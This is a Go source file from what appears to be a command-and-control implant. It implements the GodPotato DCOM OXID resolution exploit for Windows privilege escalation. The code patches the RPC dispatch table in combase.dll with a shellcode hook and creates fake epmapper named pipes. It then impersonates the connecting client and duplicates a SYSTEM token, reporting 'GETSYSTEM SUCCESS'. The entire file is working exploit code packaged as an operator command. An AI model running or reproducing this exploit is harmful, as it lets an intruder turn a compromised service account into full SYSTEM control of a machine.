//go:build windows
// +build windows

// getsystem_potato.go contains the main GodPotato DCOM OXID resolution exploit.
// The exploit is split across several files for maintainability:
//   - getsystem_potato_types.go: type definitions, constants, globals, API procs
//   - getsystem_potato_hook.go:  RPC hook mechanics and shellcode generation
//   - getsystem_potato_oxid.go:  OXID extraction, COM objects, OBJREF crafting
//   - getsystem_potato_token.go: SYSTEM token search fallback (Win11 23H2+)

package commands

import (
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"runtime"
	"strings"
	"sync/atomic"
	"time"
	"unsafe"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

// getSystemViaPotato wraps the DCOM OXID exploit with a watchdog timer.
// If the exploit hangs (e.g., COM call deadlock), the watchdog returns
// diagnostic output indicating which phase was reached.
func getSystemViaPotato(oldIdentity string) structs.CommandResult {
	var phase int32
	resultCh := make(chan structs.CommandResult, 1)

	go func() {
		resultCh <- doPotatoExploit(oldIdentity, &phase)
	}()

	select {
	case result := <-resultCh:
		return result
	case <-time.After(25 * time.Second):
		return structs.CommandResult{
			Output: fmt.Sprintf("Potato technique timed out (25s watchdog).\nLast phase: %d\nhookCalled: %v\nparamCount: %d\npipe: %s",
				atomic.LoadInt32(&phase), potatoGlobal.hookCalled, potatoGlobal.paramCount, potatoGlobal.pipeName),
			Status:    "error",
			Completed: true,
		}
	}
}

type potatoPipeSet struct {
	handles    []windows.Handle
	events     []windows.Handle
	overlapped []windows.Overlapped
}

func (ps *potatoPipeSet) close() {
	for i := range ps.handles {
		windows.CloseHandle(ps.events[i])
		windows.CloseHandle(ps.handles[i])
	}
}

func potatoCreatePipes(pipeName string) (*potatoPipeSet, error) {
	sd, err := windows.NewSecurityDescriptor()
	if err != nil {
		return nil, fmt.Errorf("NewSecurityDescriptor: %v", err)
	}
	if err := sd.SetDACL(nil, true, false); err != nil {
		return nil, fmt.Errorf("SetDACL: %v", err)
	}
	sa := windows.SecurityAttributes{
		Length:             uint32(unsafe.Sizeof(windows.SecurityAttributes{})),
		SecurityDescriptor: sd,
		InheritHandle:      0,
	}

	const n = 4
	ps := &potatoPipeSet{
		handles:    make([]windows.Handle, n),
		events:     make([]windows.Handle, n),
		overlapped: make([]windows.Overlapped, n),
	}
	pipeNamePtr, _ := windows.UTF16PtrFromString(pipeName)

	for i := 0; i < n; i++ {
		hPipe, _, pipeErr := procCreateNamedPipeW.Call(
			uintptr(unsafe.Pointer(pipeNamePtr)),
			PIPE_ACCESS_DUPLEX|FILE_FLAG_OVERLAPPED,
			0,
			PIPE_UNLIMITED_INSTANCES,
			PIPE_BUFFER_SIZE,
			PIPE_BUFFER_SIZE,
			0,
			uintptr(unsafe.Pointer(&sa)),
		)
		if hPipe == uintptr(windows.InvalidHandle) {
			for j := 0; j < i; j++ {
				windows.CloseHandle(ps.events[j])
				windows.CloseHandle(ps.handles[j])
			}
			return nil, fmt.Errorf("CreateNamedPipe[%d](%s): %v", i, pipeName, pipeErr)
		}
		evt, _ := windows.CreateEvent(nil, 1, 0, nil)
		ps.handles[i] = windows.Handle(hPipe)
		ps.events[i] = evt
		ps.overlapped[i].HEvent = evt
		procConnectNamedPipe.Call(hPipe, uintptr(unsafe.Pointer(&ps.overlapped[i])))
	}
	return ps, nil
}

type potatoCaptureResult struct {
	token    windows.Token
	identity string
	clients  []string
}

func potatoCaptureSystemToken(ps *potatoPipeSet, phase *int32) (*potatoCaptureResult, error) {
	atomic.StoreInt32(phase, 7)
	systemSID, _ := windows.StringToSid("S-1-5-18")
	result := &potatoCaptureResult{}

	deadline := time.Now().Add(15 * time.Second)
	for time.Now().Before(deadline) {
		windows.WaitForSingleObject(ps.events[0], 1000)

		for i := range ps.handles {
			wr, _ := windows.WaitForSingleObject(ps.events[i], 0)
			if wr != windows.WAIT_OBJECT_0 {
				continue
			}

			atomic.StoreInt32(phase, 8)
			hPipe := uintptr(ps.handles[i])

			ret, _, _ := procImpersonateNamedPipeClient.Call(hPipe)
			if ret == 0 {
				potatoResetPipe(ps, i)
				continue
			}

			var threadToken windows.Token
			err := windows.OpenThreadToken(windows.CurrentThread(), windows.TOKEN_ALL_ACCESS, true, &threadToken)
			if err != nil {
				err = windows.OpenThreadToken(windows.CurrentThread(), STEAL_TOKEN_ACCESS|TOKEN_QUERY, true, &threadToken)
			}
			if err != nil {
				procRevertToSelf.Call()
				potatoResetPipe(ps, i)
				continue
			}

			tokenUser, tuErr := threadToken.GetTokenUser()
			if tuErr != nil {
				threadToken.Close()
				procRevertToSelf.Call()
				potatoResetPipe(ps, i)
				continue
			}

			isSystem := tokenUser.User.Sid.Equals(systemSID)
			clientIdentity, _ := GetCurrentIdentity()
			result.clients = append(result.clients, clientIdentity)

			if !isSystem {
				searchTok, searchInfo, searchErr := searchSystemTokenViaHandles()
				threadToken.Close()
				procRevertToSelf.Call()
				procDisconnectNamedPipe.Call(hPipe)

				if searchErr == nil && searchTok != 0 {
					result.token = searchTok
					result.identity = fmt.Sprintf("token search: %s (pipe was %s)", searchInfo, clientIdentity)
					return result, nil
				}
				windows.ResetEvent(ps.events[i])
				procConnectNamedPipe.Call(hPipe, uintptr(unsafe.Pointer(&ps.overlapped[i])))
				continue
			}

			var dupToken windows.Token
			err = windows.DuplicateTokenEx(threadToken, windows.MAXIMUM_ALLOWED, nil,
				windows.SecurityDelegation, windows.TokenPrimary, &dupToken)
			if err != nil {
				err = windows.DuplicateTokenEx(threadToken, windows.MAXIMUM_ALLOWED, nil,
					windows.SecurityImpersonation, windows.TokenImpersonation, &dupToken)
			}
			threadToken.Close()
			procRevertToSelf.Call()
			procDisconnectNamedPipe.Call(hPipe)

			if err != nil {
				return nil, fmt.Errorf("connected as %s but DuplicateTokenEx: %v", clientIdentity, err)
			}

			result.token = dupToken
			result.identity = clientIdentity
			return result, nil
		}
	}
	return result, fmt.Errorf("no SYSTEM connection within 15s")
}

func potatoResetPipe(ps *potatoPipeSet, i int) {
	procDisconnectNamedPipe.Call(uintptr(ps.handles[i]))
	windows.ResetEvent(ps.events[i])
	procConnectNamedPipe.Call(uintptr(ps.handles[i]), uintptr(unsafe.Pointer(&ps.overlapped[i])))
}

// doPotatoExploit implements the actual GodPotato DCOM OXID resolution exploit.
func doPotatoExploit(oldIdentity string, phase *int32) structs.CommandResult {
	atomic.StoreInt32(phase, 0)
	if !checkPrivilege("SeImpersonatePrivilege") {
		return errorResult("SeImpersonatePrivilege not available. This technique requires a service account (NETWORK SERVICE, LOCAL SERVICE, IIS, MSSQL, etc.).")
	}

	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	atomic.StoreInt32(phase, 1)
	procCoInitializeEx.Call(0, 0)
	defer procCoUninitialize.Call()

	combaseBase, combaseSize, err := findModuleInfo("combase.dll")
	if err != nil {
		return errorf("Failed to find combase.dll: %v", err)
	}
	rpcIfaceAddr, err := scanForGUID(combaseBase, combaseSize, orcbGUID[:])
	if err != nil {
		return errorf("Failed to find ORCB RPC interface in combase.dll: %v", err)
	}

	atomic.StoreInt32(phase, 2)
	rpcIface := (*rpcServerInterface)(unsafe.Pointer(rpcIfaceAddr))
	if rpcIface.DispatchTable == 0 {
		return errorResult("RPC_SERVER_INTERFACE dispatch table pointer is null")
	}
	dispTable := (*rpcDispatchTable)(unsafe.Pointer(rpcIface.DispatchTable))
	if dispTable.DispatchTable == 0 || dispTable.DispatchTableCount == 0 {
		return errorResult("RPC dispatch table is empty")
	}
	midlInfo := (*midlServerInfo)(unsafe.Pointer(rpcIface.InterpreterInfo))
	if midlInfo == nil || midlInfo.DispatchTable == 0 {
		return errorResult("MIDL_SERVER_INFO dispatch table is null")
	}
	paramCount, paramErr := readUseProtSeqParamCount(midlInfo)
	if paramErr != nil {
		return errorf("Failed to read UseProtSeq param count: %v", paramErr)
	}
	potatoGlobal.paramCount = paramCount
	useProtSeqSlot := midlInfo.DispatchTable
	origFunc := *(*uintptr)(unsafe.Pointer(useProtSeqSlot))
	potatoGlobal.origFuncPtr = origFunc

	atomic.StoreInt32(phase, 3)
	oxid, oid, ipid, oxidErr := extractProcessOXID()
	if oxidErr != nil {
		return errorf("Failed to extract process OXID: %v", oxidErr)
	}

	atomic.StoreInt32(phase, 4)
	var rndBytes [6]byte
	rand.Read(rndBytes[:])
	pipeUniqueName := hex.EncodeToString(rndBytes[:])
	pipeName := fmt.Sprintf(`\\.\pipe\%s\pipe\epmapper`, pipeUniqueName)
	potatoGlobal.pipeName = pipeName
	potatoGlobal.pipeUniqueName = pipeUniqueName
	potatoGlobal.tokenCaptured = false
	potatoGlobal.systemToken = 0
	potatoGlobal.hookCalled = false
	potatoGlobal.precomputedDSA = buildPipeDSA(pipeUniqueName)

	pipes, pipeErr := potatoCreatePipes(pipeName)
	if pipeErr != nil {
		return errorf("%v", pipeErr)
	}
	defer pipes.close()

	atomic.StoreInt32(phase, 5)
	dsaBufAddr, dsaErr := allocateDSAOnHeap(potatoGlobal.precomputedDSA)
	if dsaErr != nil {
		return errorf("Failed to allocate DSA on heap: %v", dsaErr)
	}
	hookAddr, hookErr := buildNativeHook(paramCount, dsaBufAddr)
	if hookErr != nil {
		return errorf("Failed to build hook shellcode: %v", hookErr)
	}

	var oldProtect uint32
	err = windows.VirtualProtect(useProtSeqSlot, unsafe.Sizeof(uintptr(0)), windows.PAGE_EXECUTE_READWRITE, &oldProtect)
	if err != nil {
		return errorf("protection change on dispatch table: %v", err)
	}
	*(*uintptr)(unsafe.Pointer(useProtSeqSlot)) = hookAddr
	defer func() {
		*(*uintptr)(unsafe.Pointer(useProtSeqSlot)) = origFunc
		windows.VirtualProtect(useProtSeqSlot, unsafe.Sizeof(uintptr(0)), oldProtect, &oldProtect)
		if potatoGlobal.shellcodePage != 0 {
			windows.VirtualFree(potatoGlobal.shellcodePage, 0, windows.MEM_RELEASE)
			potatoGlobal.shellcodePage = 0
		}
	}()

	atomic.StoreInt32(phase, 6)
	triggerDone := make(chan error, 1)
	go func() {
		runtime.LockOSThread()
		defer runtime.UnlockOSThread()
		procCoInitializeEx.Call(0, 0)
		defer procCoUninitialize.Call()
		triggerDone <- triggerOXIDResolution(oxid, oid, ipid)
	}()
	var triggerErr error
	select {
	case triggerErr = <-triggerDone:
	case <-time.After(5 * time.Second):
		triggerErr = fmt.Errorf("CoUnmarshalInterface blocked for >5s")
	}

	capture, captureErr := potatoCaptureSystemToken(pipes, phase)
	if captureErr != nil && (capture == nil || capture.token == 0) {
		return potatoTimeoutError(pipeName, pipeUniqueName, paramCount, dsaBufAddr, oxid, oid, ipid, capture, triggerErr)
	}

	if setErr := SetIdentityToken(capture.token); setErr != nil {
		windows.CloseHandle(windows.Handle(capture.token))
		return errorf("Connected as SYSTEM but SetIdentityToken: %v", setErr)
	}

	newIdentity, _ := GetCurrentIdentity()
	RecordIdentityTransition("getsystem", oldIdentity, newIdentity,
		fmt.Sprintf("DCOM/Potato pipe=%s", pipeName))

	var sb strings.Builder
	sb.WriteString("=== GETSYSTEM SUCCESS (DCOM/Potato) ===\n\n")
	sb.WriteString(fmt.Sprintf("Technique: DCOM OXID resolution hook (GodPotato)\n"))
	sb.WriteString(fmt.Sprintf("Pipe: %s\n", pipeName))
	sb.WriteString(fmt.Sprintf("ParamCount: %d\n", paramCount))
	if oldIdentity != "" {
		sb.WriteString(fmt.Sprintf("Old: %s\n", oldIdentity))
	}
	sb.WriteString(fmt.Sprintf("New: %s\n", newIdentity))
	sb.WriteString("\nUse 'rev2self' to revert to original identity.\n")

	return successResult(sb.String())
}

func potatoTimeoutError(pipeName, pipeUniqueName string, paramCount int, dsaBufAddr uintptr, oxid, oid [8]byte, ipid [16]byte, capture *potatoCaptureResult, triggerErr error) structs.CommandResult {
	hookStatus := "NOT called"
	if wasHookCalled() {
		hookStatus = "CALLED"
	}
	var clients []string
	if capture != nil {
		clients = capture.clients
	}
	bindingStr := "ncacn_np:localhost/pipe/" + pipeUniqueName + `[\pipe\epmapper]`
	errMsg := fmt.Sprintf("Did not receive SYSTEM connection (15s timeout).\nPipe: %s\nBinding: %s\nHook: %s (paramCount=%d, ppdsaIndex=%d)\nDSA size: %d bytes\nDSA addr: %x\nOXID: %x\nOID: %x\nIPID: %x\nClients seen: %v",
		pipeName, bindingStr, hookStatus, paramCount, paramCount-2, len(potatoGlobal.precomputedDSA),
		dsaBufAddr, oxid, oid, ipid, clients)
	if wasHookCalled() {
		diagParams := readDiagParams()
		errMsg += fmt.Sprintf("\nHook params: RCX=%x RDX=%x R8=%x R9=%x [RSP+0x28]=%x",
			diagParams[0], diagParams[1], diagParams[2], diagParams[3], diagParams[4])
	}
	if triggerErr != nil {
		errMsg += fmt.Sprintf("\nTrigger: %v", triggerErr)
	} else {
		errMsg += "\nTrigger: completed (no error)"
	}
	return errorResult(errMsg)
}
